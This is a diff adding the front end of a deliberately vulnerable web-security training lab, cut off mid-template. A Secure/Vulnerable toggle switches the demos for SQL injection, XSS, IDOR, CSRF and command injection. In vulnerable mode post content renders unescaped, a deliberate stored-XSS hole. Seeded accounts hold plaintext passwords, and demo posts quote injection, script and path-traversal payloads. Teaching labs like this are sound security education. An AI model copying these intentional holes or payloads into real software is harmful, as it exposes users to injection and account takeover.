@@ -1,0 +1,1653 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BAI Security Lab</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=M+PLUS+Rounded+1c:wght@400;500;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = {
+  theme: {
+    extend: {
+      colors: {
+        sakura: { 50:"#fff1fb",100:"#ffd9f3",200:"#ffb7e7",500:"#ec4899",700:"#be185d",900:"#831843"},
+        neon:   { 50:"#ecfeff",100:"#cffafe",200:"#a5f3fc",500:"#06b6d4",700:"#0e7490",900:"#164e63"},
+        clay:   { 50:"#faf7f2",100:"#efe7da",200:"#dfd1bc",800:"#4e4032",900:"#2f261e"}
+      },
+      fontFamily: {
+        sans: ['"M PLUS Rounded 1c"','Manrope','system-ui','sans-serif'],
+        mono: ['"JetBrains Mono"','ui-monospace','monospace']
+      }
+    }
+  }
+}
+</script>
+<style>
+  body{
+    background:
+      radial-gradient(circle at 12% 18%, rgba(236,72,153,.22), transparent 28%),
+      radial-gradient(circle at 88% 12%, rgba(6,182,212,.22), transparent 24%),
+      radial-gradient(circle at 50% 90%, rgba(168,85,247,.18), transparent 28%),
+      linear-gradient(180deg,#fff7fb 0%,#f5fbff 46%,#fdf2f8 100%);
+    background-attachment: fixed;
+  }
+  .anime-mascot{position:fixed;left:0;top:0;z-index:50;pointer-events:none;will-change:left,top}
+  .anime-mascot-card{display:flex;height:64px;width:64px;align-items:center;justify-content:center;overflow:hidden;border-radius:9999px;border:1px solid #fbcfe8;background:rgba(255,255,255,.9);box-shadow:0 6px 18px rgba(244,114,182,.35);backdrop-filter:blur(8px)}
+  .anime-mascot-gif{display:block;height:100%;width:100%;user-select:none;object-fit:cover}
+  .anime-mascot-sway{animation:mascot-float 3.2s ease-in-out infinite}
+  @keyframes mascot-float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+  .htmx-indicator{display:none}
+  .line-clamp-3{display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+  .terminal{font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.55;background:#0b0b14;color:#cbd5e1;border-radius:14px;padding:14px 16px;overflow-x:auto;white-space:pre-wrap;word-break:break-word}
+  .terminal .ok{color:#86efac}.terminal .err{color:#fca5a5}.terminal .warn{color:#fde68a}.terminal .info{color:#93c5fd}.terminal .dim{color:#64748b}
+  details > summary{list-style:none;cursor:pointer}
+  details > summary::-webkit-details-marker{display:none}
+  .scroll-shadow{mask-image:linear-gradient(180deg,#000 92%,transparent)}
+  /* Page transition */
+  .page-enter{animation:pageIn .35s ease}
+  @keyframes pageIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+  /* Sparkle bg for hero */
+  .sparkle::before{content:"✨";position:absolute;font-size:18px;opacity:.6}
+
+  /* ----- Sakura petals ----- */
+  #sakura-canvas{position:fixed;inset:0;z-index:1;pointer-events:none}
+  .petal{position:absolute;top:-30px;width:14px;height:14px;background:radial-gradient(ellipse at 30% 30%, #ffd9f3 0%, #f9a8d4 60%, #ec4899 100%);border-radius:150% 0 150% 0;opacity:.85;will-change:transform;filter:drop-shadow(0 1px 2px rgba(236,72,153,.25))}
+  @keyframes petalFall{0%{transform:translate3d(0,-30px,0) rotate(0)}100%{transform:translate3d(var(--drift,40px),100vh,0) rotate(720deg)}}
+
+  /* ----- Mascot mode auras + speech bubble ----- */
+  .anime-mascot-card{position:relative;transition:box-shadow .4s, border-color .4s, background .4s}
+  body.sec-vuln .anime-mascot-card{border-color:#fca5a5;box-shadow:0 0 0 3px rgba(248,113,113,.25), 0 0 24px rgba(244,63,94,.55), 0 6px 18px rgba(244,63,94,.4)}
+  body.sec-secure .anime-mascot-card{border-color:#7dd3fc;box-shadow:0 0 0 3px rgba(125,211,252,.3), 0 0 24px rgba(56,189,248,.55), 0 6px 18px rgba(56,189,248,.35)}
+  body.sec-vuln .anime-mascot-card::after{content:"";position:absolute;inset:-6px;border-radius:9999px;background:radial-gradient(circle, rgba(248,113,113,.45), transparent 70%);animation:auraPulse 1.6s ease-in-out infinite;z-index:-1}
+  body.sec-secure .anime-mascot-card::after{content:"";position:absolute;inset:-6px;border-radius:9999px;background:radial-gradient(circle, rgba(56,189,248,.45), transparent 70%);animation:auraPulse 1.6s ease-in-out infinite;z-index:-1}
+  @keyframes auraPulse{0%,100%{transform:scale(1);opacity:.55}50%{transform:scale(1.18);opacity:.85}}
+  body.sec-vuln .anime-mascot-card::before{content:"";position:absolute;left:18px;top:24px;width:6px;height:6px;border-radius:9999px;background:#dc2626;box-shadow:18px 0 0 #dc2626, 0 0 8px #f87171, 18px 0 8px #f87171;animation:eyeBlink 3.2s infinite;z-index:2}
+  @keyframes eyeBlink{0%,92%,100%{opacity:1}94%,98%{opacity:0}}
+
+  .speech-bubble{position:fixed;z-index:51;max-width:220px;padding:10px 14px;background:#fff;border:2px solid #fbcfe8;border-radius:18px;font-size:12px;line-height:1.4;font-weight:600;color:#831843;box-shadow:0 8px 24px rgba(236,72,153,.25);pointer-events:none;animation:bubblePop .25s ease-out, bubbleOut .3s ease-in 4.7s forwards}
+  .speech-bubble::after{content:"";position:absolute;bottom:-8px;right:24px;width:0;height:0;border-left:8px solid transparent;border-right:8px solid transparent;border-top:8px solid #fbcfe8}
+  body.sec-secure .speech-bubble{border-color:#7dd3fc;color:#0c4a6e}
+  body.sec-secure .speech-bubble::after{border-top-color:#7dd3fc}
+  @keyframes bubblePop{from{transform:scale(.6);opacity:0}to{transform:scale(1);opacity:1}}
+  @keyframes bubbleOut{to{opacity:0;transform:translateY(-6px) scale(.95)}}
+
+  /* ----- Skeleton shimmer ----- */
+  .skeleton{position:relative;overflow:hidden;background:linear-gradient(90deg,#fdf2f8 0%,#fce7f3 50%,#fdf2f8 100%);background-size:200% 100%;animation:shimmer 1.4s infinite linear;border-radius:8px}
+  @keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}
+
+  /* ----- HUD floating panels ----- */
+  .hud{position:fixed;bottom:20px;z-index:80;background:rgba(255,255,255,.96);backdrop-filter:blur(12px);border:1px solid #fbcfe8;border-radius:18px;box-shadow:0 20px 60px rgba(236,72,153,.22);font-family:'M PLUS Rounded 1c',sans-serif}
+  .hud-collapsed{width:auto}
+  .hud-tab{display:flex;align-items:center;gap:8px;padding:10px 14px;cursor:pointer;font-weight:700;font-size:12px;color:#831843;user-select:none}
+  .hud-tab .dot{width:8px;height:8px;border-radius:9999px;background:#86efac;animation:hudDot 1.6s infinite}
+  @keyframes hudDot{0%,100%{opacity:.5}50%{opacity:1}}
+  .hud-body{max-height:60vh;overflow-y:auto;padding:0 12px 12px;font-size:12px}
+  .hud-row{padding:8px;border-radius:10px;margin-bottom:6px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.45;border:1px solid transparent;cursor:pointer}
+  .hud-row:hover{background:#fdf2f8}
+  .hud-row.method-GET{border-left:3px solid #06b6d4}
+  .hud-row.method-POST{border-left:3px solid #ec4899}
+  .hud-row.method-PUT{border-left:3px solid #f59e0b}
+  .hud-row.method-DELETE{border-left:3px solid #dc2626}
+  .pill{display:inline-block;padding:1px 8px;border-radius:9999px;font-size:10px;font-weight:800;letter-spacing:.04em}
+  .pill-200{background:#dcfce7;color:#166534}
+  .pill-403{background:#fee2e2;color:#991b1b}
+  .pill-blocked{background:#dbeafe;color:#1e40af}
+  .pill-pwn{background:#fef3c7;color:#92400e}
+
+  /* Cheatsheet drawer */
+  #cheat-drawer{position:fixed;top:0;right:-440px;width:420px;height:100vh;background:rgba(255,255,255,.98);backdrop-filter:blur(12px);border-left:1px solid #fbcfe8;box-shadow:-20px 0 60px rgba(236,72,153,.18);z-index:85;transition:right .3s ease;overflow-y:auto;font-family:'M PLUS Rounded 1c',sans-serif}
+  #cheat-drawer.open{right:0}
+  .cheat-tab{position:fixed;right:0;top:160px;z-index:84;writing-mode:vertical-rl;background:linear-gradient(180deg,#ec4899,#06b6d4);color:#fff;font-weight:800;padding:10px 6px;border-radius:8px 0 0 8px;cursor:pointer;font-size:12px;letter-spacing:.08em;box-shadow:-4px 0 12px rgba(236,72,153,.25);user-select:none}
+  .copy-btn{font-family:'JetBrains Mono',monospace;font-size:11px;background:#0b0b14;color:#cbd5e1;padding:8px 10px;border-radius:8px;width:100%;text-align:left;cursor:pointer;border:1px solid #1f2937;transition:border-color .2s,background .2s}
+  .copy-btn:hover{border-color:#ec4899;background:#11111a}
+  .copy-btn.copied{border-color:#10b981;background:#052e1f}
+  .copy-btn.copied::after{content:" ✓ copied";color:#86efac}
+</style>
+</head>
+<body class="min-h-screen flex flex-col text-slate-900 antialiased font-sans sec-vuln">
+
+<div id="sakura-canvas" aria-hidden="true"></div>
+
+<!-- ===== Header ===== -->
+<header class="sticky top-0 z-40 border-b border-fuchsia-200/70 bg-white/75 shadow-[0_10px_30px_rgba(236,72,153,0.12)] backdrop-blur-xl">
+  <nav class="mx-auto max-w-6xl px-4 py-3 sm:px-8">
+    <div class="flex flex-wrap items-center justify-between gap-4">
+      <a href="#/posts" class="inline-flex items-center gap-3 rounded-full bg-gradient-to-r from-fuchsia-500 via-pink-500 to-sky-500 px-4 py-2 text-sm font-extrabold tracking-wide text-white shadow-lg shadow-pink-200 transition hover:-translate-y-0.5 hover:shadow-pink-300">
+        <span class="text-2xl">🌸</span><span>BAI Lab</span>
+      </a>
+      <div id="navlinks" class="flex flex-wrap items-center gap-2 sm:gap-3"></div>
+    </div>
+  </nav>
+</header>
+
+<main id="main" class="flex-1 mx-auto w-full max-w-6xl px-4 py-8 sm:px-8"></main>
+
+<footer class="mt-12 border-t border-fuchsia-200/70 bg-white/80 backdrop-blur-xl">
+  <div class="mx-auto max-w-6xl px-4 py-6 text-center text-xs font-medium text-slate-500 sm:px-8">
+    <p>BAI Security Lab © 2026 • Powered by Go, Templ, HTMX & Tailwind CSS</p>
+  </div>
+</footer>
+
+<!-- Mascot -->
+<div id="anime-mascot" class="anime-mascot hidden md:block" aria-hidden="true">
+  <div class="anime-mascot-card"><div class="anime-mascot-sway">
+    <img class="anime-mascot-gif" src="anime-girl.gif" alt="" width="56" height="56" draggable="false">
+  </div></div>
+</div>
+
+<!-- HUD: Request Inspector + Attack Timeline -->
+<div id="hud-requests" class="hud" style="left:20px;width:380px">
+  <div class="hud-tab" onclick="toggleHud('hud-requests')">
+    <span class="dot"></span><span>🔍 Request Inspector</span><span style="margin-left:auto;color:#9ca3af" id="reqs-count">0</span>
+  </div>
+  <div class="hud-body" id="reqs-body" style="display:none">
+    <div id="reqs-list"></div>
+    <div id="reqs-detail" class="terminal" style="display:none;font-size:10.5px;margin-top:6px"></div>
+  </div>
+</div>
+
+<div id="hud-timeline" class="hud" style="right:20px;width:340px">
+  <div class="hud-tab" onclick="toggleHud('hud-timeline')">
+    <span class="dot" style="background:#f87171"></span><span>📜 Attack Timeline</span><span style="margin-left:auto;color:#9ca3af" id="atk-count">0</span>
+    <button onclick="event.stopPropagation();exportPoC()" title="Export PoC report" style="background:#fce7f3;border:none;border-radius:6px;padding:2px 6px;margin-left:6px;font-size:10px;color:#831843;cursor:pointer">⬇ md</button>
+  </div>
+  <div class="hud-body" id="atk-body" style="display:none">
+    <div id="atk-list"></div>
+  </div>
+</div>
+
+<!-- Cheatsheet drawer -->
+<div id="cheat-tab-handle" class="cheat-tab" onclick="toggleCheat()">⚔️ PAYLOADS</div>
+<div id="cheat-drawer">
+  <div class="px-5 py-4 border-b border-fuchsia-100 flex items-center justify-between sticky top-0 bg-white/95 backdrop-blur z-10">
+    <div>
+      <h2 class="text-lg font-extrabold">⚔️ Payload Cheat-Sheet</h2>
+      <p class="text-xs text-slate-500">Click any to copy</p>
+    </div>
+    <button onclick="toggleCheat()" class="h-8 w-8 rounded-full bg-fuchsia-50 hover:bg-fuchsia-100 text-fuchsia-700 font-bold">✕</button>
+  </div>
+  <div id="cheat-body" class="px-5 py-4 space-y-5"></div>
+</div>
+
+<script>
+/* ============================================================
+   STATE — emulates the Go service in localStorage
+============================================================ */
+const TWEAK_DEFAULTS = /*EDITMODE-BEGIN*/{
+  "securityEnabled": true,
+  "showMascot": true
+}/*EDITMODE-END*/;
+
+const STATE_KEY = "bailab.state.v1";
+const defaultState = () => ({
+  securityEnabled: TWEAK_DEFAULTS.securityEnabled,
+  session: null, // {username, role, id}
+  flash: null,   // {message, isError}
+  users: [
+    {id:1, username:"admin",  password:"admin",   email:"admin@example.com", role:"admin",
+     passwordHash:"$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"},
+    {id:2, username:"alice",  password:"hunter2", email:"alice@example.com", role:"user",
+     passwordHash:"$2a$10$kI...alice..."},
+    {id:3, username:"bob",    password:"qwerty",  email:"bob@example.com",   role:"user",
+     passwordHash:"$2a$10$kI...bob..."},
+  ],
+  posts: [
+    {id:1, title:"Welcome to BAI Lab", post_content:"This server-rendered demo contrasts an insecure and a secure version of the same app. Toggle the Security switch to flip behaviour.", published:1, author_id:1, created_at:"2026-04-12"},
+    {id:2, title:"SQL Injection 101", post_content:"In Vulnerable mode the search endpoint concatenates user input directly into a SELECT. Try the payload: ' OR 1=1 --", published:1, author_id:1, created_at:"2026-04-15"},
+    {id:3, title:"Stored XSS demo", post_content:"Comments are rendered unescaped in Vulnerable mode. The classic <scr"+"ipt>alert(1)</scr"+"ipt> works.", published:1, author_id:2, created_at:"2026-04-20"},
+    {id:4, title:"Draft: Path Traversal notes", post_content:"Internal notes about ../../../etc/passwd attempts on /api/files?name=...", published:0, author_id:2, created_at:"2026-04-22"},
+    {id:5, title:"On rounded cyber-cute UI", post_content:"M PLUS Rounded 1c + sakura gradients give the lab a friendly aesthetic without hiding the danger.", published:1, author_id:3, created_at:"2026-04-25"},
+  ],
+  comments: [
+    {id:1, post_id:3, author:"alice",  body:"Nice writeup!"},
+    {id:2, post_id:3, author:"bob",    body:"<em>cool emphasis</em>"},
+  ],
+  nextPostId: 6,
+  nextUserId: 4,
+  nextCommentId: 3,
+});
+
+let S = load();
+function load(){
+  try{ const raw = localStorage.getItem(STATE_KEY); if(raw) return JSON.parse(raw); }catch(e){}
+  return defaultState();
+}
+function save(){ localStorage.setItem(STATE_KEY, JSON.stringify(S)); }
+function resetState(){ localStorage.removeItem(STATE_KEY); S = defaultState(); save(); render(); }
+
+/* ============================================================
+   ROUTER
+============================================================ */
+const routes = {
+  "/posts": pagePosts,
+  "/login": pageLogin,
+  "/register": pageRegister,
+  "/posts/new": pagePostNew,
+  "/admin": pageAdmin,
+  "/vuln": pageVulnIndex,
+  "/vuln/sqli": pageVulnSqli,
+  "/vuln/xss": pageVulnXss,
+  "/vuln/idor": pageVulnIdor,
+  "/vuln/csrf": pageVulnCsrf,
+  "/vuln/cmd": pageVulnCmd,
+  "/vuln/exposure": pageVulnExposure,
+  "/about": pageAbout,
+};
+
+function parseHash(){
+  const h = location.hash.replace(/^#/, "") || "/posts";
+  const [path, queryStr] = h.split("?");
+  const query = Object.fromEntries(new URLSearchParams(queryStr || ""));
+  // Match dynamic: /posts/edit/:id, /posts/view/:id
+  if (/^\/posts\/edit\/(\d+)$/.test(path))   return {fn: pagePostEdit, params:{id: +RegExp.$1}, query};
+  if (/^\/posts\/view\/(\d+)$/.test(path))   return {fn: pagePostView, params:{id: +RegExp.$1}, query};
+  return {fn: routes[path] || pagePosts, params:{}, query};
+}
+
+window.addEventListener("hashchange", render);
+
+/* ============================================================
+   COMMON UI
+============================================================ */
+function badge(){
+  return S.securityEnabled
+    ? `<span class="inline-flex items-center gap-1 rounded-full border border-cyan-200 bg-gradient-to-r from-emerald-400 to-cyan-400 px-3 py-1 text-xs font-bold text-white shadow-sm shadow-cyan-200">🛡️ Secure</span>`
+    : `<span class="inline-flex items-center gap-1 rounded-full border border-rose-200 bg-gradient-to-r from-rose-400 to-orange-400 px-3 py-1 text-xs font-bold text-white shadow-sm shadow-rose-200">⚠️ Vulnerable</span>`;
+}
+function navLink(href,label,icon){
+  return `<a href="${href}" class="inline-flex items-center gap-2 rounded-full border border-fuchsia-200 bg-white/80 px-4 py-2 text-sm font-semibold text-slate-700 shadow-sm transition hover:-translate-y-0.5 hover:border-pink-300 hover:bg-fuchsia-50 hover:text-fuchsia-700">${icon?`<span>${icon}</span>`:""}<span>${label}</span></a>`;
+}
+function navLinkActive(href,label,icon){
+  return `<a href="${href}" class="inline-flex items-center gap-2 rounded-full border border-fuchsia-300 bg-fuchsia-50 px-4 py-2 text-sm font-semibold text-fuchsia-700 shadow-sm">${icon?`<span>${icon}</span>`:""}<span>${label}</span></a>`;
+}
+function renderHeader(){
+  const path = location.hash.replace(/^#/,"") || "/posts";
+  const isActive = p => path === p || path.startsWith(p+"/");
+  const link = (p,l,i)=> isActive(p) ? navLinkActive("#"+p,l,i) : navLink("#"+p,l,i);
+
+  let html = "";
+  html += link("/posts","Posts","📝");
+  html += link("/vuln","Vuln Demos","🧪");
+  if(S.session && S.session.role === "admin") html += link("/admin","Admin","🛠️");
+  if(!S.session){
+    html += link("/login","Login","🔑");
+    html += link("/register","Register","✍️");
+  } else {
+    html += `<span class="inline-flex items-center gap-2 rounded-full bg-fuchsia-100 px-3 py-2 text-sm font-semibold text-fuchsia-800">👤 ${escapeHtml(S.session.username)}</span>`;
+    html += `<button onclick="logout()" class="inline-flex items-center gap-2 rounded-full border border-fuchsia-200 bg-white/80 px-4 py-2 text-sm font-semibold text-slate-700 shadow-sm transition hover:-translate-y-0.5 hover:border-pink-300 hover:bg-fuchsia-50 hover:text-fuchsia-700">🚪 Logout</button>`;
+  }
+  html += badge();
+  document.getElementById("navlinks").innerHTML = html;
+}
+
+function escapeHtml(s){return String(s ?? "").replace(/[&<>"']/g, m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[m]))}
+
+function flashHTML(){
+  if(!S.flash) return "";
+  const {message, isError} = S.flash;
+  S.flash = null; save();
+  return resultMessage(message, isError);
+}
+function resultMessage(message, isError){
+  if(!message) return "";
+  return isError
+    ? `<div class="flex items-center gap-3 rounded-lg border border-red-200 bg-red-50 px-4 py-3 text-sm font-medium text-red-800" role="alert"><span class="text-lg">⚠️</span><span>${escapeHtml(message)}</span></div>`
+    : `<div class="flex items-center gap-3 rounded-lg border border-emerald-200 bg-emerald-50 px-4 py-3 text-sm font-medium text-emerald-800" role="status"><span class="text-lg">✓</span><span>${escapeHtml(message)}</span></div>`;
+}
+
+function setFlash(message, isError){ S.flash = {message, isError}; save(); }
+
+function panel(inner, extra=""){
+  return `<div class="rounded-2xl border border-fuchsia-100 bg-white/90 p-6 shadow-[0_12px_40px_rgba(236,72,153,0.12)] backdrop-blur ${extra}">${inner}</div>`;
+}
+function pageWrap(html){
+  return `<div class="page-enter">${html}</div>`;
+}
+function pageHeader(title, sub, icon){
+  return `
+    <div class="mb-8">
+      <h1 class="text-4xl font-bold text-slate-900">${icon?icon+" ":""}${escapeHtml(title)}</h1>
+      ${sub?`<p class="text-slate-600 mt-2">${escapeHtml(sub)}</p>`:""}
+    </div>`;
+}
+
+function inputField({label,name,type="text",value="",placeholder="",required=false,rows=null,min,max,extra=""}){
+  const common = `class="w-full rounded-xl border border-fuchsia-200 bg-white px-3 py-2 text-slate-900 outline-none ring-2 ring-transparent focus:border-pink-400 focus:ring-pink-100 transition" name="${name}" id="${name}" placeholder="${escapeHtml(placeholder)}" ${required?"required":""} ${min?`minlength="${min}"`:""} ${max?`maxlength="${max}"`:""} ${extra}`;
+  const ctrl = rows
+    ? `<textarea ${common} rows="${rows}">${escapeHtml(value)}</textarea>`
+    : `<input ${common} type="${type}" value="${escapeHtml(value)}">`;
+  return `
+    <div>
+      <label class="block text-sm font-semibold text-slate-700 mb-2" for="${name}">${escapeHtml(label)}</label>
+      ${ctrl}
+    </div>`;
+}
+function primaryBtn(label, type="submit"){
+  return `<button class="inline-flex items-center justify-center gap-2 px-4 py-2.5 rounded-full bg-gradient-to-r from-fuchsia-500 via-pink-500 to-sky-500 text-white font-semibold shadow-lg shadow-pink-200 transition hover:-translate-y-0.5 hover:shadow-pink-300 active:translate-y-0" type="${type}">${label}</button>`;
+}
+function ghostBtn(label, href){
+  return `<a class="inline-flex items-center gap-2 px-4 py-2.5 rounded-full border border-fuchsia-200 bg-white/80 text-slate-700 font-semibold hover:bg-fuchsia-50 hover:text-fuchsia-700 transition" href="${href}">${escapeHtml(label)}</a>`;
+}
+
+/* ============================================================
+   PAGES
+============================================================ */
+function pagePosts(){
+  const loggedIn = !!S.session;
+  const sec = S.securityEnabled;
+  const flash = flashHTML();
+
+  let banner = "";
+  if(sec){
+    banner = loggedIn
+      ? `<div class="rounded-2xl border border-emerald-200 bg-emerald-50 px-5 py-4 text-sm font-medium text-emerald-800 shadow-sm"><span class="mr-2">✓</span>Logged in as <strong>${escapeHtml(S.session.username)}</strong>. You can now create and manage posts.</div>`
+      : `<div class="rounded-2xl border border-amber-200 bg-amber-50 px-5 py-4 text-sm font-medium text-amber-800 shadow-sm"><span class="mr-2">⚠️</span>Log in to create, edit, or delete posts. <a href="#/login" class="ml-2 font-semibold underline decoration-amber-400 underline-offset-2">Go to login</a></div>`;
+  }
+
+  const formHtml = (sec && !loggedIn) ? `
+    <div class="space-y-4">
+      <p class="text-sm text-slate-600">You need to log in before adding posts.</p>
+      <a href="#/login" class="inline-flex items-center justify-center gap-2 px-4 py-2.5 rounded-full bg-gradient-to-r from-fuchsia-500 via-pink-500 to-sky-500 text-white font-semibold shadow-lg shadow-pink-200 transition hover:-translate-y-0.5 hover:shadow-pink-300">🔑 Go to login</a>
+    </div>`
+  : `
+    <form onsubmit="return submitCreatePost(event)" class="space-y-4">
+      ${inputField({label:"Title",name:"title",placeholder:"Post title",required:true,min:1,max:200})}
+      ${inputField({label:"Content",name:"post_content",placeholder:"Write your post content here...",rows:6})}
+      <label class="flex items-center gap-2 cursor-pointer">
+        <input class="w-4 h-4 rounded border-fuchsia-300 text-fuchsia-600 focus:ring-2 focus:ring-fuchsia-500" type="checkbox" name="published" value="1">
+        <span class="text-sm font-medium text-slate-700">Publish immediately</span>
+      </label>
+      ${primaryBtn("✓ Create Post")}
+    </form>`;
+
+  return pageWrap(`
+    <div class="space-y-8">
+      <div>
+        <h1 class="text-4xl font-bold text-slate-900">📝 Posts</h1>
+        <p class="text-slate-600 mt-2">Manage all blog posts in one place</p>
+      </div>
+      ${banner}
+      ${flash?`<div>${flash}</div>`:""}
+      <div class="grid lg:grid-cols-3 gap-8">
+        <div class="lg:col-span-1">
+          <div class="sticky top-24 rounded-2xl border border-fuchsia-100 bg-white/90 p-6 shadow-[0_12px_40px_rgba(236,72,153,0.12)] backdrop-blur">
+            <h2 class="text-lg font-bold text-slate-900 mb-4">✨ Create Post</h2>
+            ${formHtml}
+          </div>
+        </div>
+        <div class="lg:col-span-2">
+          <div class="flex items-center justify-between mb-4">
+            <h2 class="text-lg font-bold text-slate-900">All Posts</h2>
+            <button onclick="render()" class="inline-flex items-center gap-1.5 rounded-full border border-fuchsia-100 bg-fuchsia-50 px-3 py-1.5 text-sm font-semibold text-fuchsia-700 shadow-sm transition hover:-translate-y-0.5 hover:bg-fuchsia-100" title="Refresh posts list">🔄 Refresh</button>
+          </div>
+          <div id="posts-container">${postsList(visiblePosts(), !sec || loggedIn)}</div>
+        </div>
+      </div>
+    </div>
+  `);
+}
+
+function visiblePosts(){
+  // In secure mode, only published posts visible to non-authors
+  const sec = S.securityEnabled;
+  return S.posts.filter(p => {
+    if(p.published === 1) return true;
+    if(!sec) return true; // vulnerable: shows drafts to everyone
+    if(S.session && (S.session.role === "admin" || S.session.id === p.author_id)) return true;
+    return false;
+  });
+}
+
+function postsList(posts, canEdit){
+  if(posts.length === 0){
+    return `<div class="py-12 text-center"><p class="text-2xl mb-2">📭</p><p class="text-lg font-semibold text-slate-700">No posts yet</p><p class="text-sm text-slate-500 mt-1">Create your first post to get started</p></div>`;
+  }
+  return `<div id="posts-list" class="grid gap-4 sm:gap-6">${posts.map(p=>postCard(p,canEdit)).join("")}</div>`;
+}
+function postCard(p, canEdit){
+  const author = S.users.find(u => u.id === p.author_id);
+  const authorName = author ? author.username : "unknown";
+  const sec = S.securityEnabled;
+  const mayEdit = canEdit && (!sec || (S.session && (S.session.role==="admin" || S.session.id===p.author_id)));
+  // VULNERABILITY simulation: in vulnerable mode, render content as HTML (stored XSS-style)
+  const contentHtml = sec ? escapeHtml(p.post_content) : p.post_content;
+  return `
+    <article class="rounded-2xl border border-fuchsia-100 bg-white/90 p-5 shadow-[0_12px_40px_rgba(236,72,153,0.08)] transition hover:-translate-y-0.5 hover:shadow-[0_16px_50px_rgba(236,72,153,0.14)] sm:p-6">
+      <div class="flex items-start justify-between gap-4 mb-3">
+        <div class="flex-1">
+          <a href="#/posts/view/${p.id}"><h3 class="text-lg sm:text-xl font-bold text-slate-900 leading-tight transition hover:text-fuchsia-700">${escapeHtml(p.title)}</h3></a>
+          <p class="text-xs text-slate-500 mt-1">Post ID: ${p.id} • by <span class="font-semibold text-fuchsia-700">@${escapeHtml(authorName)}</span> • ${escapeHtml(p.created_at||"")}</p>
+        </div>
+        ${p.published===1
+          ? `<span class="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-semibold bg-gradient-to-r from-emerald-100 to-cyan-100 text-emerald-700 whitespace-nowrap">✓ Published</span>`
+          : `<span class="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-semibold bg-gradient-to-r from-amber-100 to-rose-100 text-amber-700 whitespace-nowrap">⊙ Draft</span>`}
+      </div>
+      <div class="text-slate-700 text-sm leading-relaxed mb-4 line-clamp-3">${contentHtml}</div>
+      ${mayEdit ? `
+        <div class="flex items-center gap-2 pt-4 border-t border-fuchsia-100">
+          <a class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-sm font-semibold bg-fuchsia-50 text-fuchsia-700 hover:bg-fuchsia-100 transition" href="#/posts/edit/${p.id}">✏️ Edit</a>
+          <button onclick="deletePost(${p.id})" class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-sm font-semibold bg-rose-50 text-rose-700 hover:bg-rose-100 transition">🗑️ Delete</button>
+          <a class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-sm font-semibold text-slate-600 hover:bg-slate-100 transition ml-auto" href="#/posts/view/${p.id}">Open →</a>
+        </div>` : `
+        <div class="pt-4 border-t border-fuchsia-100"><a class="text-sm font-semibold text-fuchsia-600 hover:text-fuchsia-700" href="#/posts/view/${p.id}">Read more →</a></div>
+      `}
+    </article>`;
+}
+
+function submitCreatePost(e){
+  e.preventDefault();
+  const fd = new FormData(e.target);
+  const title = (fd.get("title")||"").toString().trim();
+  const content = (fd.get("post_content")||"").toString();
+  const published = fd.get("published") ? 1 : 0;
+  if(S.securityEnabled && !S.session){ setFlash("Please log in to create posts.", true); render(); return false;}
+  if(!title){ setFlash("Title is required.", true); render(); return false; }
+  S.posts.unshift({id:S.nextPostId++, title, post_content: content, published, author_id: S.session ? S.session.id : 1, created_at: new Date().toISOString().slice(0,10)});
+  setFlash("Post created successfully.", false);
+  save(); render(); return false;
+}
+
+function deletePost(id){
+  if(!confirm("Delete this post?")) return;
+  const sec = S.securityEnabled;
+  const p = S.posts.find(x=>x.id===id);
+  if(!p){ setFlash("Post not found.", true); render(); return; }
+  if(sec && (!S.session || (S.session.role!=="admin" && S.session.id!==p.author_id))){
+    setFlash("You don't have permission to delete this post.", true); render(); return;
+  }
+  S.posts = S.posts.filter(x=>x.id!==id);
+  setFlash("Post deleted.", false);
+  save(); render();
+}
+
+/* ---------------- Post Detail (with comments demo) ---------------- */
+function pagePostView({params}){
+  const p = S.posts.find(x=>x.id===params.id);
+  if(!p) return pageWrap(panel(`<p class="text-slate-700">Post not found.</p>`));
+  const sec = S.securityEnabled;
+  const author = S.users.find(u=>u.id===p.author_id);
+  const contentHtml = sec ? escapeHtml(p.post_content) : p.post_content;
+  const myComments = S.comments.filter(c=>c.post_id===p.id);
+  const canEditPost = !sec || (S.session && (S.session.role==="admin" || S.session.id===p.author_id));
+  return pageWrap(`
+    <div class="max-w-3xl mx-auto space-y-6">
+      <a href="#/posts" class="text-sm font-semibold text-fuchsia-600 hover:text-fuchsia-700">← Back to Posts</a>
+      ${flashHTML()}
+      <article class="rounded-2xl border border-fuchsia-100 bg-white/90 p-8 shadow-[0_12px_40px_rgba(236,72,153,0.12)] backdrop-blur">
+        <div class="flex items-center justify-between gap-4 mb-3">
+          <div>
+            <h1 class="text-3xl font-bold text-slate-900">${escapeHtml(p.title)}</h1>
+            <p class="text-xs text-slate-500 mt-1">by <span class="font-semibold text-fuchsia-700">@${escapeHtml(author?author.username:"unknown")}</span> • ${escapeHtml(p.created_at||"")}</p>
+          </div>
+          ${p.published===1
+            ? `<span class="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-semibold bg-gradient-to-r from-emerald-100 to-cyan-100 text-emerald-700">✓ Published</span>`
+            : `<span class="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-semibold bg-gradient-to-r from-amber-100 to-rose-100 text-amber-700">⊙ Draft</span>`}
+        </div>
+        <div class="prose prose-sm max-w-none text-slate-700 leading-relaxed">${contentHtml}</div>
+        ${canEditPost?`<div class="flex gap-2 pt-6 mt-6 border-t border-fuchsia-100">
